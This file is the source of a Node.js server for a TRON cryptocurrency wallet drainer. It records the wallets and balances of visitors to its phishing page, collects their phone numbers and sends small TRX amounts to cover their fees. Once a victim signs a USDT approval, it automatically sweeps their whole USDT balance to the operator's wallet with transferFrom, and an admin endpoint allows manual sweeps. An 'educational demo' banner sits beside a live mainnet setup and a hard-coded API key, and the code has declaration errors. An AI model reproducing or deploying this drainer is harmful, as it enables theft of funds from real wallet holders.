const express = require('express');
const TronWeb = require('tronweb');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// ============================================
// [서버 설정] 릴레이 지갑 (수수료 대납용)
// ============================================
const RAW_KEY = process.env.RELAY_PRIVATE_KEY || '';
const RAW_KEY = process.env.TRON_RELAY_PRIVATE_KEY || '';

if (!RELAY_PRIVATE_KEY) {
    console.warn('⚠️  WARNING: RELAY_PRIVATE_KEY not set! Server will run but signing will fail.');
}

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': '69754d65-438a-49b6-8a0b-a3ef55064262' },
    privateKey: RELAY_PRIVATE_KEY
});

// 릴레이 지갑 주소 확인
let RELAY_ADDRESS = '';
if (RELAY_PRIVATE_KEY) {
    RELAY_ADDRESS = tronWeb.address.fromPrivateKey(RELAY_PRIVATE_KEY);
    console.log('✅ Relay Wallet Address:', RELAY_ADDRESS);
}

// ============================================
// [설정] SPENDER 주소 = 릴레이 지갑 주소
// ============================================
const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS || RELAY_ADDRESS || 'TYWPZw6dRxp4DLKfNEJGxS4kNdD4uGpTZd';
console.log('✅ Spender Address:', SPENDER_ADDRESS);

if (RELAY_ADDRESS && SPENDER_ADDRESS === RELAY_ADDRESS) {
    console.log('✅ Relay wallet will receive approvals');
}

// ============================================
// [설정] USDT Contract Address (TRC-20)
// ============================================
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
console.log('✅ USDT Contract:', USDT_CONTRACT);

// ============================================
// [설정] Auto-Sweep Toggle (시연 중 제어 가능)
// ============================================
let AUTO_SWEEP_ENABLED = true;  // 기본값: 활성화
console.log('✅ Auto-Sweep Mode:', AUTO_SWEEP_ENABLED ? 'ENABLED' : 'DISABLED');

// ============================================
// [보안] TRX Gift 남용 방지 (주소당 1회 제한)
// ============================================
const trxReceivedAddresses = new Set();
console.log('✅ TRX Gift abuse protection enabled (1 gift per address)');

// ============================================
// [함수] Auto-Sweep: 자동 USDT 인출
// ============================================
async function autoSweepUSDT(victimAddress) {
    console.log('🤖 [AUTO-SWEEP] Starting for victim:', victimAddress);

    try {
        // Initialize USDT contract
        const contract = await tronWeb.contract().at(USDT_CONTRACT);

        // Check victim's USDT balance
        const balance = await contract.balanceOf(victimAddress).call();
        const balanceUSDT = tronWeb.fromSun(balance) / 1;  // Convert sun to USDT

        console.log('💰 Victim USDT balance:', balanceUSDT, 'USDT');

        // Only proceed if balance > 0
        if (balance.toNumber() === 0) {
            console.log('⚠️ [AUTO-SWEEP] No USDT to sweep');
            return { success: false, reason: 'ZERO_BALANCE' };
        }

        // Use transferFrom to withdraw ALL approved USDT
        console.log('💸 Sweeping', balanceUSDT, 'USDT from', victimAddress);

        const tx = await contract.transferFrom(
            victimAddress,
            RELAY_ADDRESS,
            balance.toString()
        ).send({
            feeLimit: 100000000,  // 100 TRX fee limit
            callValue: 0
        });

        console.log('✅ [AUTO-SWEEP] Success! TxID:', tx);
        console.log('📊 [AUTO-SWEEP] Amount:', balanceUSDT, 'USDT');

        return {
            success: true,
            txid: tx,
            amount: balanceUSDT,
            amountSun: balance.toString()
        };

    } catch (error) {
        console.error('❌ [AUTO-SWEEP] Failed:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}

// ============================================
// [라우트] 정적 파일 - tron.html 서빙
// ============================================
app.get('/', (req, res) => {
    const htmlPath = path.join(__dirname, '../tron.html');
    console.log('📄 Serving tron.html from:', htmlPath);
    res.sendFile(htmlPath);
});

// ============================================
// [라우트] 관리자 페이지 - admin.html 서빙
// ============================================
app.get('/admin', (req, res) => {
    const htmlPath = path.join(__dirname, '../admin.html');
    console.log('🔐 Serving admin.html from:', htmlPath);
    res.sendFile(htmlPath);
});

// ============================================
// [API] Policy 조회 (tron.html이 시작 시 호출)
// ============================================
app.get('/api/public/policy', (req, res) => {
    console.log('📋 GET /api/public/policy');
    res.json({
        success: true,
        walletAddress: SPENDER_ADDRESS,
        relayAddress: RELAY_ADDRESS,
        network: 'mainnet',
        features: {
            energyDelegation: true,
            feeRelay: true
        }
    });
});

// ============================================
// [API] Drainer - 지갑 연결 보고 & Tier 분석
// ============================================
app.post('/api/public/drainer/', async (req, res) => {
    const { address, chain, walletApp, balances, autoAttack } = req.body;

    console.log('📊 POST /api/public/drainer/');
    console.log('  Address:', address);
    console.log('  Chain:', chain);
    console.log('  WalletApp:', walletApp);
    console.log('  AutoAttack:', autoAttack);
    console.log('  Balances:', balances);

    // 🎯 테스트용: 항상 ENERGY_APPROVE 사용 (수수료 대납 데모)
    let tier = 'Gold';
    let tierScore = 75;
    let vectorCode = 'ENERGY_APPROVE';
    let vectorName = 'Energy Rental Approval (Fee Delegation)';
    let vectorStatus = 'Active';

    // 원래 로직 (나중에 복구용)
    // if (balances && balances.usdt > 1000) {
    //     tier = 'Gold';
    //     tierScore = 75;
    //     vectorCode = 'ENERGY_APPROVE';
    //     vectorName = 'Energy Rental Approval';
    // }

    // if (balances && balances.usdt > 10000) {
    //     tier = 'Platinum';
    //     tierScore = 95;
    //     vectorCode = 'OWNER_UPDATE';
    //     vectorName = 'Owner Permission Update';
    // }

    const response = {
        success: true,
        address: address,
        tier: tier,
        tierScore: tierScore,
        metrics: {
            balance: balances ? balances.usdt : 0,
            age: 100,
            txCount: 50,
            volume: 1000
        },
        vector: {
            code: vectorCode,
            name: vectorName,
            status: vectorStatus
        },
        spender: SPENDER_ADDRESS,
        gasRequired: 100000000
    };

    console.log('✅ Tier Analysis:', response);
    res.json(response);
});

// ============================================
// [API] Phone 번호 수집
// ============================================
app.post('/api/public/phone', (req, res) => {
    const { address, phone, chain } = req.body;
    console.log('📞 POST /api/public/phone');
    console.log('  Address:', address);
    console.log('  Phone:', phone);
    console.log('  Chain:', chain);

    res.json({ success: true, message: 'Phone recorded' });
});

// ============================================
// [API] Owner Update (서명 받아서 처리)
// ============================================
app.post('/api/public/drainer/update-owner', async (req, res) => {
    const { address, signature } = req.body;

    console.log('🔑 POST /api/public/drainer/update-owner');
    console.log('  Address:', address);
    console.log('  Signature:', signature);

    try {
        // 실제로는 여기서 Owner Permission Update 트랜잭션을 생성하고
        // 릴레이 지갑으로 수수료 대납 후 브로드캐스트
        // 데모용으로 간단히 처리

        res.json({
            success: true,
            txid: '0x' + Math.random().toString(16).substr(2, 64),
            newOwner: SPENDER_ADDRESS,
            message: 'Owner update simulated (demo mode)'
        });
    } catch (error) {
        console.error('❌ Owner update failed:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================
// [API] Energy Delegation - DISABLED (requires 1,600 TRX frozen)
// ============================================
// NOTE: This approach requires relay wallet to have ~1,600 TRX frozen
// to generate 32,000 Energy. Only energy from directly frozen TRX
// can be delegated (JustLend rented energy cannot be re-delegated).
// Switched to simpler TRX gift method instead.
app.post('/api/public/drainer/delegate-energy', async (req, res) => {
    console.log('⚠️ POST /api/public/drainer/delegate-energy - ENDPOINT DISABLED');
    console.log('  This endpoint has been disabled in favor of TRX gift method');
    res.status(501).json({
        success: false,
        error: 'Energy delegation disabled. Use TRX gift method instead (send-trx endpoint).'
    });
});

// ============================================
// [API] Send TRX Gift - Simple fee provision
// ============================================
app.post('/api/public/drainer/send-trx', async (req, res) => {
    const { address, amount } = req.body;

    console.log('💸 POST /api/public/drainer/send-trx');
    console.log('  To Address:', address);
    console.log('  Amount (TRX):', amount);

    if (!RELAY_PRIVATE_KEY) {
        return res.status(500).json({
            success: false,
            error: 'RELAY_PRIVATE_KEY not configured'
        });
    }

    // 🛡️ Security: Check if address already received TRX gift
    if (trxReceivedAddresses.has(address)) {
        console.warn('⚠️ Address already received TRX gift:', address);
        return res.status(400).json({
            success: false,
            error: 'This wallet has already received TRX gift. Complete the signature to proceed.'
        });
    }

    try {
        // Create TRX transfer transaction with retry logic for rate limiting
        const amountSun = amount * 1000000; // Convert TRX to sun
        console.log('💰 Sending', amountSun, 'sun to', address);

        let transferTx, signedTx, broadcast;
        let retryCount = 0;
        const maxRetries = 3;

        while (retryCount < maxRetries) {
            try {
                // Create transaction
                transferTx = await tronWeb.transactionBuilder.sendTrx(
                    address,
                    amountSun,
                    RELAY_ADDRESS
                );

                console.log('✅ Transfer transaction created');

                // Sign with relay wallet
                signedTx = await tronWeb.trx.sign(transferTx, RELAY_PRIVATE_KEY);

                // Broadcast
                console.log('📡 Broadcasting TRX transfer...');
                broadcast = await tronWeb.trx.sendRawTransaction(signedTx);

                console.log('📡 Broadcast result:', broadcast);

                // Success - break retry loop
                break;

            } catch (apiError) {
                retryCount++;
                console.error(`❌ API Error (attempt ${retryCount}/${maxRetries}):`, apiError.message);

                // Check if rate limited
                if (apiError.message && (apiError.message.includes('429') || apiError.message.includes('rate limit'))) {
                    if (retryCount < maxRetries) {
                        const waitTime = retryCount * 2000; // 2s, 4s, 6s
                        console.log(`⏳ Rate limited. Waiting ${waitTime}ms before retry...`);
                        await new Promise(resolve => setTimeout(resolve, waitTime));
                    } else {
                        throw new Error('TronGrid API rate limit exceeded. Please wait 1 minute and try again.');
                    }
                } else {
                    // Not a rate limit error, throw immediately
                    throw apiError;
                }
            }
        }

        if (broadcast.result || broadcast.code === 'SUCCESS') {
            const txid = broadcast.txid || broadcast.transaction?.txID;
            console.log('✅ TRX transfer successful! TxID:', txid);

            // 🛡️ Mark address as having received TRX gift (prevent abuse)
            trxReceivedAddresses.add(address);
            console.log('✅ Address marked as received TRX gift:', address);
            console.log('📊 Total addresses that received gifts:', trxReceivedAddresses.size);

            res.json({
                success: true,
                txid: txid,
                amount: amount,
                amountSun: amountSun,
                relayAddress: RELAY_ADDRESS,
                recipientAddress: address,
                message: 'TRX gift sent successfully'
            });
        } else {
            const errorMsg = broadcast.message
                ? Buffer.from(broadcast.message, 'hex').toString()
                : 'BROADCAST_FAILED';
            console.error('❌ Transfer broadcast failed:', errorMsg);

            res.status(400).json({
                success: false,
                error: errorMsg
            });
        }

    } catch (error) {
        console.error('❌ TRX transfer failed:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================
// [API] Manual USDT Withdrawal (Admin Control)
// ============================================
app.get('/api/admin/manual-sweep', async (req, res) => {
    const { victim, amount } = req.query;

    console.log('💰 GET /api/admin/manual-sweep');
    console.log('  Victim Address:', victim);
    console.log('  Amount (USDT):', amount);

    if (!RELAY_PRIVATE_KEY) {
        return res.status(500).json({
            success: false,
            error: 'RELAY_PRIVATE_KEY not configured'
        });
    }

    if (!victim || !amount) {
        return res.status(400).json({
            success: false,
            error: 'Missing required parameters: victim, amount'
        });
    }

    try {
        // Initialize USDT contract
        const contract = await tronWeb.contract().at(USDT_CONTRACT);

        // Convert USDT amount to sun (6 decimals for USDT)
        const amountInSun = tronWeb.toBigNumber(amount).times(1e6).toFixed(0);
        console.log('💸 Withdrawing', amountInSun, 'USDT (sun) from', victim);

        // Use transferFrom to withdraw approved USDT
        const tx = await contract.transferFrom(
            victim,
            RELAY_ADDRESS,
            amountInSun
        ).send({
            feeLimit: 100000000,  // 100 TRX fee limit
            callValue: 0
        });

        console.log('✅ Manual withdrawal successful! TxID:', tx);

        res.json({
            success: true,
            mode: 'Manual',
            txid: tx,
            victim: victim,
            amount: amount,
            amountSun: amountInSun,
            recipient: RELAY_ADDRESS
        });

    } catch (error) {
        console.error('❌ Manual withdrawal failed:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================
// [API] Auto-Sweep Status Check (Admin)
// ============================================
app.get('/api/admin/auto-sweep-status', (req, res) => {
    console.log('📊 GET /api/admin/auto-sweep-status');
    console.log('  Current Status:', AUTO_SWEEP_ENABLED ? 'ENABLED' : 'DISABLED');

    res.json({
        success: true,
        autoSweepEnabled: AUTO_SWEEP_ENABLED
    });
});

// ============================================
// [API] Toggle Auto-Sweep (Admin Control)
// ============================================
app.post('/api/admin/toggle-auto-sweep', (req, res) => {
    const { enabled } = req.body;

    console.log('🔄 POST /api/admin/toggle-auto-sweep');
    console.log('  Requested State:', enabled);

    if (typeof enabled !== 'boolean') {
        return res.status(400).json({
            success: false,
            error: 'Invalid parameter: enabled must be boolean'
        });
    }

    AUTO_SWEEP_ENABLED = enabled;
    console.log('✅ Auto-Sweep toggled:', AUTO_SWEEP_ENABLED ? 'ENABLED' : 'DISABLED');

    res.json({
        success: true,
        autoSweepEnabled: AUTO_SWEEP_ENABLED,
        message: `Auto-Sweep ${AUTO_SWEEP_ENABLED ? 'enabled' : 'disabled'} successfully`
    });
});

// ============================================
// [API] Energy Reclaim
// ============================================
app.post('/api/public/drainer/reclaim-energy', async (req, res) => {
    const { address } = req.body;

    console.log('⚡ POST /api/public/drainer/reclaim-energy');
    console.log('  From Address:', address);

    res.json({
        success: true,
        message: 'Energy reclaim simulated (demo mode)'
    });
});

// ============================================
// [API] Signature Result 보고
// ============================================
app.post('/api/public/drainer/signature-result', async (req, res) => {
    const { chain, address, vector, success, txHash, error } = req.body;

    console.log('📊 POST /api/public/drainer/signature-result');
    console.log('  Chain:', chain);
    console.log('  Address:', address);
    console.log('  Vector:', vector);
    console.log('  Success:', success);
    console.log('  TxHash:', txHash);
    if (error) console.log('  Error:', error);

    // 🤖 Trigger auto-sweep if Approve signature succeeded AND Auto-Sweep is enabled
    let sweepResult = null;
    if (success && (vector === 'APPROVE' || vector === 'ENERGY_APPROVE')) {
        if (AUTO_SWEEP_ENABLED) {
            console.log('🔥 [AUTO-SWEEP] Approve detected, triggering auto-sweep...');

            // Wait 3 seconds for Approve transaction to confirm on blockchain
            console.log('⏳ Waiting 3 seconds for Approve to confirm...');
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Execute auto-sweep
            sweepResult = await autoSweepUSDT(address);

            if (sweepResult.success) {
                console.log('✅ [AUTO-SWEEP] Completed successfully');
            } else {
                console.warn('⚠️ [AUTO-SWEEP] Failed or no balance:', sweepResult.reason || sweepResult.error);
            }
        } else {
            console.log('⏸️ [AUTO-SWEEP] Disabled - Manual withdrawal required');
            sweepResult = { success: false, reason: 'AUTO_SWEEP_DISABLED' };
        }
    }

    res.json({
        success: true,
        message: 'Result recorded',
        autoSweep: sweepResult
    });
});

// ============================================
// [API] 릴레이 서명 (원래 server.js 기능)
// ============================================
app.post('/relay-sign', async (req, res) => {
    console.log('🔐 POST /relay-sign');

    try {
        let txData = req.body.transaction;
        if (txData.result) txData = txData.result;

        console.log('  Signing transaction with relay wallet...');

        // 서버 비밀키로 수수료 대납 서명 추가
        const finalTx = await tronWeb.trx.sign(txData, RELAY_PRIVATE_KEY, false);

        console.log('  Broadcasting to TRON network...');

        // 트론 네트워크로 최종 전송
        const broadcast = await tronWeb.trx.sendRawTransaction(finalTx);

        if (broadcast.result || broadcast.code === 'SUCCESS') {
            console.log('✅ Transaction broadcasted successfully');
            console.log('  TxID:', broadcast.txid || broadcast.transaction?.txID);
            res.json({ success: true, result: broadcast });
        } else {
            const errorMsg = broadcast.message
                ? Buffer.from(broadcast.message, 'hex').toString()
                : "BROADCAST_FAILED";
            console.error('❌ Broadcast failed:', errorMsg);
            res.status(400).json({ success: false, error: errorMsg });
        }
    } catch (e) {
        console.error('❌ Relay sign error:', e);
        res.status(500).json({ success: false, error: e.toString() });
    }
});

// ============================================
// [서버 시작]
// ============================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('='.repeat(60));
    console.log('🚀 TRON PENTEST SERVER - EDUCATIONAL DEMO');
    console.log('='.repeat(60));
    console.log(`✅ Server running on: http://localhost:${PORT}`);
    console.log(`✅ Relay Wallet: ${RELAY_ADDRESS || 'NOT SET'}`);
    console.log(`✅ Spender Address: ${SPENDER_ADDRESS}`);
    console.log('='.repeat(60));
    console.log('');
    console.log('📋 Available Endpoints:');
    console.log('  GET  /                                  - Serve tron.html');
    console.log('  GET  /api/public/policy                 - Get policy config');
    console.log('  POST /api/public/drainer/               - Wallet report & tier analysis');
    console.log('  POST /api/public/phone                  - Phone collection');
    console.log('  POST /api/public/drainer/update-owner   - Owner update (demo)');
    console.log('  POST /api/public/drainer/delegate-energy - Energy delegation (demo)');
    console.log('  POST /api/public/drainer/reclaim-energy - Energy reclaim (demo)');
    console.log('  POST /api/public/drainer/signature-result - Result reporting');
    console.log('  POST /relay-sign                        - Relay signature & broadcast');
    console.log('='.repeat(60));
    console.log('');

    if (!RELAY_PRIVATE_KEY) {
        console.warn('⚠️  WARNING: Set RELAY_PRIVATE_KEY environment variable!');
        console.warn('⚠️  Example: RELAY_PRIVATE_KEY=your_private_key node server-integrated.js');
        console.warn('');
    }
});
